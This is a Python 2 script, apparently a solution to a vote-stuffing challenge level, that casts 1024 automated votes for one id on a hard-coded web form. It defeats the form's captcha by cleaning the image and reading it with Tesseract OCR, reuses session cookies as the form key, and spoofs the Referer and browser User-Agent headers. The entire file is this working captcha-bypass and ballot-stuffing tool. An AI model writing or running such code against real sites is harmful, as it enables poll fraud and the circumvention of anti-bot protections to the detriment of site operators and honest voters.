#!/usr/bin/python2
"""
This module votes for id 77 at given url by reading a captcha.
Ref: http://stackoverflow.com/questions/37745519/use-pytesseract-to-recognize-text-from-image
"""
import requests
import shutil
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract


url = 'http://54.221.6.249/level5.php'
headers = {'Referer': url, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
payload = {'id': '77', 'holdthedoor': 'Submit+Query', 'key': '', 'captcha': ''}
for i in range(1024):
    cookies = requests.get(url).cookies
    req = requests.get('http://54.221.6.249/tim.php', cookies=cookies, stream=True)
    if req.status_code == 200:
        with open('/tmp/img_file', 'wb') as f:
            req.raw.decode_content = True
            shutil.copyfileobj(req.raw, f)
    img = Image.open("/tmp/img_file")
    img = img.convert('RGBA')
    pix = img.load()
    for y in range(img.size[1]):
        for x in range(img.size[0]):
            if pix[x, y][0] < 102 or pix[x, y][1] < 102 or pix[x, y][2] < 102:
                pix[x, y] = (0, 0, 0, 255)
            else:
                pix[x, y] = (255, 255, 255, 255)
    img.save('/tmp/img_file2.png')
    img = Image.open("/tmp/img_file2.png")
    img = img.filter(ImageFilter.MedianFilter())
    enhancer = ImageEnhance.Contrast(img)
    img =  enhancer.enhance(2)
    img = img.convert('1')
    img.save('/tmp/img_file3.png')
    payload['captcha'] = pytesseract.image_to_string(Image.open('/tmp/img_file3.png'))
    payload['key'] = cookies['HoldTheDoor']
    requests.post(url, data=payload, headers=headers, cookies=cookies)
